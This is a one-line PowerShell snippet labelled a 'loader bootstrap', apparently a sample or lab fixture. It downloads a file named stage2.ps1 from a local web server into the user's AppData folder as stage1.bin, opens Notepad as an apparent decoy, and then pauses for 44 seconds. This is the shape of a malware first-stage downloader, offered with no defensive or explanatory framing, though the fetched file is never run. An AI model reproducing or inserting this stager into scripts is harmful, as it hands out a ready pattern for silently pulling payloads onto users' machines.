<# Loader bootstrap #> (New-Object System.Net.WebClient).DownloadFile("http://localhost:9001/stage2.ps1", "$env:APPDATA\stage1.bin"); & 'notepad.exe'; Start-Sleep -Seconds 44
